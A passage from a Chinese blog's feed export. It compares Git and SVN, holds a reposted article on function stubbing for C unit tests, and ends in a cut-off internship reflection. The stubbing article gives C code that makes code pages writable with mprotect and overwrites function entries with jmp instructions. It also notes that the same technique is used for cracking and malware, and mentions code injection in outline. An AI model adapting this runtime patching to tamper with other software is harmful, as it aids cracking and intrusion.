分支和里程碑的实现</h1><p>几乎每一种版本控制系统都以某种形式支持分支。使用分支意味着你可以从开发主线上分离开来，然后在不影响主线的同时继续工作。在很多版本控制系统中，这是个昂贵的过程，常常需要创建一个源代码目录的完整副本，对大型项目来说会花费很长时间。</p><p>轻量级分支/里程碑的含义是，创建分支/里程碑的复杂度是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathrm">1</span><span class="mclose">)</span></span></span></span>，不会因为版本库的愈加庞大而变得缓慢。在CVS中，创建分支的复杂度是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathit">n</span><span class="mclose">)</span></span></span></span>的，导致大的版本库的的分支创建非常缓慢。</p><blockquote><p>CVS （代码版本控制软件）：<a href="https://baike.baidu.com/item/CVS/405463" target="_blank" rel="noopener">百度百科</a></p></blockquote><h2 id="61-subversion的分支里程碑"><a class="markdownIt-Anchor" href="#61-subversion的分支里程碑"></a> 6.1 Subversion的分支/里程碑</h2><p>Subversion轻量级分支和里程碑的实现是通过svn cp命令，即带历史的拷贝就是创建快速创建分支和里程碑的秘籍。Subversion的版本库有特殊的设计，当你复制一个目录，你不需要担心版本库会变得十分巨大—Subversion并不是拷贝所有的数据，相反，它只是建立了一个已存在目录树的入口。这种“廉价的拷贝”就是创建分支/里程碑是轻量级的原因。</p><p>由于Svn的分支和标签是来自目录拷贝，约定俗成是拷贝在 branches/和tags/目录下。所谓分支，tag等概念都只是仓库中不同路径上的一个对象或索引而已，和普通的路径并没有什么本质的区别，谁也不能阻止在一个提交中同时修改不同分支中的数据。</p><p>里程碑是对某个历史提交所起的一个别名，作为历史的标记，是不应该被更改的。svn的里程碑要建立到 tags/目录下，要求不要在tags/下的里程碑目录下进行提交。但是谁也阻止不了对未进行权限控制的里程碑的篡改。</p><h2 id="62-git-的轻量级分支和里程碑"><a class="markdownIt-Anchor" href="#62-git-的轻量级分支和里程碑"></a> 6.2 Git 的轻量级分支和里程碑</h2><p>Git中的分支实际上仅是一个包含所指对象校验和（40个字符长度SHA-1 哈希值）的文件，所以创建和销毁一个分支就变得非常廉价。说白了，新建一个分支就是向一个文件写入41个字节（版本号外加一个换行符）那么简单，自然速度就很快了。 Git的实现与项目复杂度无关，它永远可以在几毫秒的时间内完成分支的创建和切换。这和大多数版本控制系统形成了鲜明对比。</p><p>Git的分支是完全隔离的，而Subversion则没有。分支本来就应该是相对独立的命名空间，一个提交一般只能发生在一个分支中。在Git中，其内部的对象层级依赖关系或许和SVN类似，但是其工作树的视图表现形式和SVN完全不同。工作树永远是一个完整的分支，不同的分支由不同的head索引去构建，你不可能在工作树中同时获得多个分支的内容。</p><p>Git使用的标签有两种类型：轻量级的（lightweight）和含附注的（annotated）。</p><p>① 轻量级标签就像是个不会变化的分支，实际上它就是个指向特定提交对象的引用。</p><p>② 而含附注标签，实际上是存储在仓库中的一个独立对象，它有自身的校验和信息，包含着标签的名字，电子邮件地址和日期，以及标签说明，标签本身也允许使用GNU Privacy Guard (GPG) 来签署或验证。</p><p>Git的里程碑是只读的，Git完全遵守历史不可更改这一时空法则。用户不能向git的里程碑中提交，否则里程碑就不是标记，而成了一个分支。当然Git允许用户删除里程碑再重新创建指定到不同历史提交。</p><h2 id="63-多分支间的切换"><a class="markdownIt-Anchor" href="#63-多分支间的切换"></a> 6.3 多分支间的切换</h2><p>SVN中提供了一个功能switch，使用switch可以在同一个工作树上，在不同的分支中进行切换。</p><p>Git在分支中进行切换使用的命令是checkout。</p><h1 id="7-分支与合并"><a class="markdownIt-Anchor" href="#7-分支与合并"></a> 7 分支与合并</h1><p>Git 和 Svn 的分支实现机制完全的不同，这也直接导致了 SVN 在分支合并中困难重重。尽管在 SVN 1.5 之后，通过 svn:mergeinfo 属性引入了合并追踪机制，但是在特定情况下，合并仍会出现很多困难。</p><h2 id="71-svn的分支合并"><a class="markdownIt-Anchor" href="#71-svn的分支合并"></a> 7.1 SVN的分支合并</h2><p>当你在一个分支上工作数周或几个月之后，主干的修改也同时在进行着，两条线的开发会区别巨大，当你想合并分支回主干，可能因为太多冲突，已经无法轻易合并你的分支和主干的修改。</p><p>另一个问题，Subversion不会记录任何合并操作，当你提交本地修改，版本库并不能判断出你是通过svn merge还是手工修改得到这些文件。所以你必须手工记录这些信息（说明合并的特定版本号或是版本号的范围）。</p><p>要解决以上的问题只有通过有规律的将主干合并到分支来避免，制定这样一个政策：每周将上周的修改合并到分支，注意这样做时需要小心，你必须手工记录合并的过程，以避免重复的合并，你需要小心的撰写合并的日志信息，精确的描述合并包括的范围。这样做看起来有点像是胁迫。</p><p>SVN 的版本号是连续的版本号。每一次新的提交都会版本号+1 ，而无论这个提交是在哪个分支中进行的。SVN一个提交可以同时修改不同分支的不同文件，因为提交命令可以在 /trunk, /branches, /tags 的上一级目录执行。</p><ul><li>SVN 的提交是单线索的，每一个提交（最原始的提交0除外）都只有一个父节点（版本号小一个的提交节点）</li><li>SVN 的提交链只有一条，仅从版本号和提交说明，我们无法获得分支图</li><li>SVN 的分支图在某些工具（如乌龟SVN）可以提供，那是需要对提交内容进行检查，对目录拷贝动作视为分支，对 svn:mergeinfo 的改动视为合并，但这会由于目录管理的灵活性，导致千奇百怪的分支图表。</li></ul><h2 id="72-git的分支合并"><a class="markdownIt-Anchor" href="#72-git的分支合并"></a> 7.2 Git的分支合并</h2><p>在 git 版本库中创建分支的成本几乎为零，所以，不必吝啬多创建几个分支。当第一次执行git-init时，系统就会创建一个名为”master”的分支。 而其它分支则通过手工创建。下面列举一些常见的分支策略。</p><p>① 创建一个属于自己的个人工作分支，以避免对主分支 master 造成太多的干扰，也方便与他人交流协作。<br>② 当进行高风险的工作时，创建一个试验性的分支，扔掉一个烂摊子总比收拾一个烂摊子好得多。<br>③ 合并别人修改的时候，最好创建一个临时的分支用来合并，合并完成后再“fatch”到自己的分支。</p><p>Git分支相关的操作命令</p><h1 id="8-撤消操作"><a class="markdownIt-Anchor" href="#8-撤消操作"></a> 8 撤消操作</h1><h2 id="81-提交的撤销"><a class="markdownIt-Anchor" href="#81-提交的撤销"></a> 8.1 提交的撤销</h2><p>在Subversion中一旦完成向服务器的数据提交，你就没有办法再从客户端追回，只能在后续的提交中修正（回退或者修改）等。因为Subversion作为集中式的版本控制，不能允许个人对已提交的数据进行篡改。Subversion具有一个非常重要的特性就是它的信息从不丢失，即使当你删除了文件或目录，它也许从最新版本中消失了 ，但这个对象依然存在于历史的早期版本中。</p><p>Git则不同，Git是分布式版本控制系统，代码库是属于个人，允许任意修改。Git通过对提交建立数字摘要来保证提交的唯一性和不可更改性，通过版本库在多人之间的多份拷贝来保障数据的安全性。Git可以丢弃最新的一个或几个提交，使用 git reset –hard命令可以永远丢弃最新的一个或者几个提交。</p><h2 id="82-提交说明的修改"><a class="markdownIt-Anchor" href="#82-提交说明的修改"></a> 8.2 提交说明的修改</h2><p>提交后如果对提交说明不满意，如何实现对提交说明的修改：</p><ol><li>Git可以使用命令git commit –amend修改提交说明。<ul><li>Git可以修改最后一次提交说明，并不是说不能修改历史版本的提交说明，只是修改最后一个版本提交说明拥有最简单的命令；</li><li>Git修改提交说明，会改变提交的commit-id。即修改提交说明后，将产生一个新的提交；</li><li>Git可以通过git reset –hard ，git commit –amend，git rebase onto 等命令来实现对历史提交的修改；</li><li>使用stg工具可以更为简单的修改历史提交的提交说明，包括提交内容；</li></ul></li><li>Subversion也可以修改提交说明，是通过修改提交的svn:log版本属性实现的：<ul><li>不但可以修改最后一次提交的说明，并且可以修改历史提交的提交说明；</li><li>Subversion修改提交说明是不可逆的操作，可能会造成说明被恶意修改；</li><li>Subversion缺省关闭修改提交说明的功能。管理员在设置了提交说明更改的邮件通知后，才可以打开该功能。</li></ul></li></ol><h2 id="83-修改和重构历史提交"><a class="markdownIt-Anchor" href="#83-修改和重构历史提交"></a> 8.3 修改和重构历史提交</h2><p>Git可以修改和重构历史提交：使用Git本身的reset以及 rebase 命令可以修改或者重整/重构历史提交，非常灵活。使用强大的 stg 可以使得历史提交的重构更为简洁，如果您对 stg 或者 Hg/MQ 熟悉的话。</p><p>Subversion 修改历史提交，只能由管理员完成。</p><p>Subversion 是集中式版本控制系统，从客户端一旦完成提交，就没有办法从客户端撤销提交。但是管理员可以在服务器端完成提交的撤销和修改，但是操作过程和代价较大。</p><h1 id="9-权限管理"><a class="markdownIt-Anchor" href="#9-权限管理"></a> 9 权限管理</h1><p>Subversion通过对文件目录授权来实现权限管理，子目录默认继承父目录的权限。但是也有缺憾，即权限不能在分支中继承，不能对单个文件授权。例如为 /trunk及其子目录的授权，不能继承到分支或者标签中相应的目录下。</p><p>Git 的授权做不到Subversion那样精细。Git的授权模型只能实现非零即壹式的授权，要么拥有全部的写权限，要么没有写权限，要么拥有整个版本库的读权限，要么禁用。</p><p>从技术上将，Git可能永远也做不到类似SVN的路径授权（读授权）：</p><ul><li>如果允许按照路径授权，则各个克隆的关系将不再是平等的关系，有的内容多，有的内容少，分布式的理念被破坏</li><li>如果只有部分路径可读，则克隆出来的提交和原始提交的提交ID可能不同。因为提交ID是和提交内容有关的，克隆中提交的部分内容被丢弃，势必提交的ID也要重新计算</li><li>允许全部代码可读，只允许部分代码可写，在版本控制的管理下，是没有多大实际意义的，而且导致了提交的逻辑上的不完整。</li></ul><p>那么有什么办法来解决授权的问题？</p><ol><li>公司内部代码开放。即代码在公司内部，对项目组成员一视同仁的开放。</li><li>公司对代码库进行合理分解，对每个代码库分别授权。即某个代码库对团队成员完全开放，对其它团队完全封闭。</li><li>公司使用Subversion做集中式的版本控制，个人和/或团队使用 Git-svn。这样在无法改变公司版本控制策略时，程序员可以采用的变通之法。</li><li>Git服务器的部署实际上可以使用钩子对分支和路径进行写授权，即可以控制谁能够创建分支，能够写特定文件。</li></ol><h1 id="10-优缺点比较"><a class="markdownIt-Anchor" href="#10-优缺点比较"></a> 10 优缺点比较</h1><h2 id="101-svn优缺点"><a class="markdownIt-Anchor" href="#101-svn优缺点"></a> 10.1 SVN优缺点</h2><p><strong>优点</strong>：</p><ol><li>管理方便，逻辑明确，符合一般人思维习惯。</li><li>易于管理，集中式服务器更能保证安全性。</li><li>代码一致性非常高。</li><li>适合开发人数不多的项目开发。</li></ol><p><strong>缺点</strong>：</p><ol><li>服务器压力太大，数据库容量暴增。</li><li>如果不能连接到服务器上，基本上不可以工作，看上面第二步，如果服务器不能连接上，就不能提交，还原，对比等等。</li><li>不适合开源开发（开发人数非常非常多，但是Google app engine就是用svn的）。但是一般集中式管理的有非常明确的权限管理机制（例如分支访问限制），可以实现分层管理，从而很好的解决开发人数众多的问题。</li></ol><h2 id="102-git优缺点"><a class="markdownIt-Anchor" href="#102-git优缺点"></a> 10.2 Git优缺点</h2><p><strong>优点</strong>：</p><ol><li>适合分布式开发，强调个体。</li><li>公共服务器压力和数据量都不会太大。</li><li>速度快、灵活。</li><li>任意两个开发者之间可以很容易的解决冲突。</li><li>离线工作。</li></ol><p><strong>缺点</strong>：</p><ol><li>学习周期相对而言比较长。</li><li>不符合常规思维。</li><li>代码保密性差，一旦开发者把整个库克隆下来就可以完全公开所有代码和版本信息。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指针 vs 引用 vs 指针引用</title>
      <link href="/2022/04/18/%E6%8C%87%E9%92%88-vs-%E5%BC%95%E7%94%A8-vs-%E6%8C%87%E9%92%88%E5%BC%95%E7%94%A8/"/>
      <url>/2022/04/18/%E6%8C%87%E9%92%88-vs-%E5%BC%95%E7%94%A8-vs-%E6%8C%87%E9%92%88%E5%BC%95%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>待补充</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数打桩</title>
      <link href="/2022/04/18/%E5%87%BD%E6%95%B0%E6%89%93%E6%A1%A9/"/>
      <url>/2022/04/18/%E5%87%BD%E6%95%B0%E6%89%93%E6%A1%A9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p><strong>转载</strong>：<a href="https://sim41.com/2019/11/28/stub/" target="_blank" rel="noopener">stub</a></p></blockquote><h1 id="1-定义"><a class="markdownIt-Anchor" href="#1-定义"></a> 1 定义</h1><p>函数打桩，就是将一个函数用另一个函数实现(桩代码)进行替换，以达到在原有函数入口的位置执行新的实现。函数打桩类似于Windows系统中的钩子Hook，不过Hook针对的是事件，这里针对的是函数，或者说是函数的入口。在做C的Cunit单元测试时，遇到了这样的概念，在此梳理一下。</p><h1 id="2-目的"><a class="markdownIt-Anchor" href="#2-目的"></a> 2 目的</h1><p>函数打桩的目的一般是隔离、占位和控制，这里是参考其他博主的文章进行的大概分类，其实也不是很严格。</p><p>隔离就是将复杂的函数从程序中隔离，比如一个复杂的嵌套函数，如果只想要知道前几步的运行结果，则可以在调用下一层函数时替换一个简单的实现，甚至直接return。在进行流程的测试时比较常见。</p><p>占位就是对一些未实现的函数进行占位，多见于协同开发中，对于其他人完成的函数可以先使用空函数进行占位。</p><p>控制就是将原本的函数功能进行替换，控制流程。如在测试中，替换函数部分内容得到需要的结果，以进行单元测试。或者对一些系统函数进行替换，实现自己的功能。如常见的将内存分配的函数替换为自己重写的内存池分配等，这里就是一个函数Hook。</p><h1 id="3-方法"><a class="markdownIt-Anchor" href="#3-方法"></a> 3 方法</h1><h2 id="31-编译时打桩"><a class="markdownIt-Anchor" href="#31-编译时打桩"></a> 3.1 编译时打桩</h2><p>用宏定义#define，在预处理时进行字符串替换，将原函数定义成桩函数的形式。同时可以使用条件编译来控制编译选项。</p><h2 id="32-链接时打桩"><a class="markdownIt-Anchor" href="#32-链接时打桩"></a> 3.2 链接时打桩</h2><p>将桩函数定义到新的库文件中，并在原代码基础上增加条件编译选项，屏蔽原有的库，采用桩函数库。</p><h2 id="33-运行时打桩"><a class="markdownIt-Anchor" href="#33-运行时打桩"></a> 3.3 运行时打桩</h2><p>运行时打桩是对内存的应用，我们知道程序的函数是在代码段中存储，一个函数的操作对应一个栈帧的存储地址，如果在调用函数时，在一旦访问这个栈帧，我们就使它跳转到我们需要的桩函数去，那么也就实现了函数的打桩。这种方法要复杂一点，但是不需要对原有的代码进行修改，而是额外增加了打桩和还原的操作，在进行单元测试时也常用。</p><p>简单来说，就是读取到原函数指令的地址，并读取桩函数的地址，并使用jmp命令从原函数跳转到桩函数去，以实现打桩。</p><p>一个完整的打桩流程应该分为装载和卸载，因此需要做到的是记录原函数的函数指针，记录桩函数的函数指针，计算地址差值，调用jmp指令，完成桩函数的装载。使用完成后，再删除jmp指令，恢复原函数。此间由于操作系统对于进程的保护机制，可能存在对于进程内存的解锁和权限设置，将指定内存区域设定为可读可写可操作的权限。</p><h3 id="331-数据结构"><a class="markdownIt-Anchor" href="#331-数据结构"></a> 3.3.1 数据结构</h3><p>设定一个链表用于存储原函数、桩函数之间的对应关系，使用链表是为了动态分配同时记录多个函数。数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stub</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stub</span> *<span class="title">node</span>;</span></span><br><span class="line"><span class="keyword">void</span> *orig_f;<span class="comment">//原函数的函数指针</span></span><br><span class="line"><span class="keyword">void</span> *stub_f;<span class="comment">//桩函数的函数指针</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> old_flg;<span class="comment">//存储原有内存的权限</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> assm[<span class="number">5</span>];<span class="comment">//用于暂存原函数起始的5字节指令，用于被jmp指令(0xE9 + 4bytes地址)覆盖后恢复</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="332-设置内存的保护属性"><a class="markdownIt-Anchor" href="#332-设置内存的保护属性"></a> 3.3.2 设置内存的保护属性</h3><p>在Linux下，mprotect()函数可以用于更改指定内存区域的保护属性。原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br><span class="line"><span class="comment">//addr为内存起始地址，必须是内存页的起始地址</span></span><br><span class="line"><span class="comment">//len为内存区域长度,以字节为单位，必须是页大小的整数倍</span></span><br><span class="line"><span class="comment">//prot为权限值，类似于Linux的权限值</span></span><br></pre></td></tr></table></figure><p>同样，在Windows下，采用读取系统的页大小:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">long</span> pagesize = sysconf(_SC_PAGESIZE);</span><br></pre></td></tr></table></figure><p>计算内存页的起始地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">pageof</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p &amp; ~(pagesize - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="333-安装桩函数"><a class="markdownIt-Anchor" href="#333-安装桩函数"></a> 3.3.3 安装桩函数</h3><p>计算原函数与桩函数地址的偏移量，将原函数的入口5字节指令替换为jmp [offset]，同时缓存原本的5字节，用于后续的恢复。</p><p>jmp指令对应0xE9，后续为4字节的偏移量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">install_stub</span><span class="params">(<span class="keyword">void</span> *orig_f, <span class="keyword">void</span> *stub_f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//初始化stub数据结构</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stub</span> *<span class="title">pstub</span> = <span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">stub</span>));</span></span><br><span class="line">  pstub-&gt;orig_f = orig_f;</span><br><span class="line">  pstub-&gt;stub_f = stub_f;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//设置内存保护属性</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="number">-1</span> == mprotect(pageof(orig_f), pagesize * <span class="number">2</span>, PROT_READ | PROT_WRITE | PROT_EXEC))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"mprotect to w+r+x faild"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(errno);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//缓存原函数orig_f头部的5字节指令</span></span><br><span class="line">  <span class="built_in">memcpy</span>(pstub-&gt;assm, pstub-&gt;orig_f, <span class="keyword">sizeof</span>(pstub-&gt;assm));</span><br><span class="line">  <span class="comment">//将头部重写为jmp [offset]</span></span><br><span class="line">  *((<span class="keyword">char</span>*)pstub-&gt;orig_f) = <span class="number">0xE9</span>;</span><br><span class="line">  offset = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">long</span>)pstub-&gt;stub_f - ((<span class="keyword">long</span>)pstub-&gt;orig_f + <span class="number">5</span>));</span><br><span class="line">  *((<span class="keyword">unsigned</span> <span class="keyword">int</span>*)((<span class="keyword">char</span>*)pstub-&gt;orig_f + <span class="number">1</span>)) = offset;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//如果有多线程同时操作，加锁</span></span><br><span class="line">  <span class="comment">//lock()；</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//如果对多个函数打桩，维护struct stub 链表</span></span><br><span class="line">  <span class="comment">//list_add(&amp;ptsub-&gt;node, &amp;head)；</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//unlock();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="334-卸载桩函数"><a class="markdownIt-Anchor" href="#334-卸载桩函数"></a> 3.3.4 卸载桩函数</h3><p>将原函数开始的5字节恢复，并释放stub结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">uninstall_stub</span><span class="params">(<span class="keyword">void</span> *stub_f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//从桩函数链表中找到要释放的桩函数对应的数据结构</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stub</span> *<span class="title">pstub</span> = <span class="title">NULL</span>:</span></span><br><span class="line">  pstub = find_pstub(stub_f);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//设置内存保护属性</span></span><br><span class="line">  mprotect(pageof(pstub-&gt;orig_f), pagesize * <span class="number">2</span>, PROT_READ | PROT_WRITE | PROT_EXEC);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//恢复原函数的初始5字节指令</span></span><br><span class="line">  <span class="built_in">memcpy</span>(pstub-&gt;orig_f, pstub-&gt;assm, <span class="keyword">sizeof</span>(pstub-&gt;assm));</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//删除节点</span></span><br><span class="line">  del_node(pstub)；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码只包含了关键代码，部分声明省略，并未对异常情况进行处理。</p><h1 id="4-进程内存安全"><a class="markdownIt-Anchor" href="#4-进程内存安全"></a> 4 进程内存安全</h1><p>这里的函数打桩利用jmp指令将原有的函数入口跳转到了我们指定的桩函数入口，自然会想到在非法情况下，也利用jmp将原本的函数跳转到指定的函数去。其实这也是一些病毒的做法，跳转到非法代码；或者一些软件破解的方法，将原本的验证机制跳转屏蔽。只不过我们打桩时是在同一进程内部进行了跳转，且是在获取源码到情况下进行的。而在破解和攻击时，一般只有可执行文件的二进制代码，此时可以通过反汇编得到程序的汇编指令，并找到需要修改的函数入口。在攻击时，也存在另外一个问题，就是跨进程的权限，在进程外对进程的内存进行修改。</p><p>操作系统对内存的保护，采取了虚拟地址空间（进程独立的虚拟内存），内存起点的随机偏移量（不能找到代码段段入口）等方式。而且mprotect()仅可以对同一进程的内存块进行修改。如果想要修改其他进程的内存块的保护属性，就要从两个方面下手，一是变成同一个进程，另一个则是对mprotect()动手脚。</p><p>当成同一个进程，可以使用代码注入，让我们的攻击代码从进程自身发出，则我们的代码就有了通过mprotect改变进程保护属性的权限。</p><p>而对mprotect()做手脚，即实现我们自己的mprotect()函数，让其模仿内核函数的行为，但是却拥有跨进程的能力。这就要编写一个类似于mprotect()函数功能的内核模块。</p><p>具体的操作暂时还没有深入了解，原理如上述所示。</p><h1 id="5-cunit的使用"><a class="markdownIt-Anchor" href="#5-cunit的使用"></a> 5 Cunit的使用</h1><p>CUnit是一个C语言的单元测试框架，以静态链接库的形式，连接到用户代码中。提供了语义丰富的断言和多种测试结果输出接口，可以方便地生成测试报告。可以结合 gcov/lcov等生成测试覆盖度报表。</p><h2 id="51-结构"><a class="markdownIt-Anchor" href="#51-结构"></a> 5.1 结构</h2><p>Cunit的结构基本如下图所示，分为三层，第一层是总的测试入口，第二层是测试包，第三层是测试用例。然后通过一系列的断言展示测试结果。</p><img src="https://s2.loli.net/2022/04/18/mIGRBMVLqA9Urha.jpg" width="500" height="400" alt="图片名称" align="center" id="164"><h2 id="52-基本流程"><a class="markdownIt-Anchor" href="#52-基本流程"></a> 5.2 基本流程</h2><ol><li>编写待测函数对应的测试函数（如果必要，需要写suite的init/cleanup函数）</li><li>初始化Test Registry - CU_initialize_registry()</li><li>把测试包（Test Suites）加入到Test Registry - CU_add_suite()</li><li>把测试用例（Test Case）加入到测试包当中 - CU_add_test()</li><li>使用适当的接口来运行测试测试程序，例如 CU_console_run_tests()</li><li>清除Test Registry - CU_cleanup_registry()</li></ol><h1 id="6-参考"><a class="markdownIt-Anchor" href="#6-参考"></a> 6 参考</h1><p><a href="https://blog.csdn.net/wangwencong/article/details/8189778" target="_blank" rel="noopener">wangwencong-认识单元测试中的打桩</a></p><p><a href="https://www.yanbinghu.com/2019/07/28/59484.html" target="_blank" rel="noopener">守望-库打桩机制-偷梁换柱</a></p><p><a href="https://m.2cto.com/kf/201708/667113.html" target="_blank" rel="noopener">一种C语言”打桩”的源码实现</a></p><p><a href="https://www.freebuf.com/articles/system/191865.html" target="_blank" rel="noopener">Covfefe-深入Linux | 如何在任意进程中修改内存保护（含PoC）</a></p><p><a href="https://promisechen.github.io/kbase/cunit.html" target="_blank" rel="noopener">陈令祥-CUnit测试工具</a></p>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为实习任务-codecheck</title>
      <link href="/2022/04/18/%E5%8D%8E%E4%B8%BA%E5%AE%9E%E4%B9%A0%E4%BB%BB%E5%8A%A1-codecheck/"/>
      <url>/2022/04/18/%E5%8D%8E%E4%B8%BA%E5%AE%9E%E4%B9%A0%E4%BB%BB%E5%8A%A1-codecheck/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>在华为实习的三个月(2021.9-2021.11)中有两个月(9&amp;11月)都在做codecheck的工作，重复性操作，&quot;毫无&quot;技术含量可言。</p><p>令我惊讶的是：2022年4月份在实习答辩时，我说做了codecheck的工作。一位老师说（具体咋说的忘了，大致意思是：你是实习生，才三个月，华为不会让你改代码的（指核心代码？），你不要吹过头了），当时我愣住了，哈哈哈哈🥦。</p><p>答辩结束后仔细想了下，应该这样说：“实习期间，部门正好有codecheck的任务，我在其中做了一部分工作（包括xxx），改完代码后有检视人员保障代码质量。”</p><p>值得肯定的是：面对老师的奇怪语气+奇怪问法，没有进行反驳，毕竟到时间了（答辩每人10min），而且老师也没有听的意思。</p><p>总而言之，答辩时表达要得体（本次实习答辩自己多多少少存在这方面的问题，可能真是吹的口吻，只是自己没察觉）；认真听取老师的意见，一些情况下没必要进行反驳。还有就是要努力🥦🥦🥦</p><blockquote><p><a href="https://www.bookstack.cn/read/openharmony-1.0-zh-cn/contribute-OpenHarmony-cpp-coding-style-guide.md" target="_blank" rel="noopener">华为c++语言编程规范</a></p></blockquote><h1 id="2-冗余代码"><a class="markdownIt-Anchor" href="#2-冗余代码"></a> 2 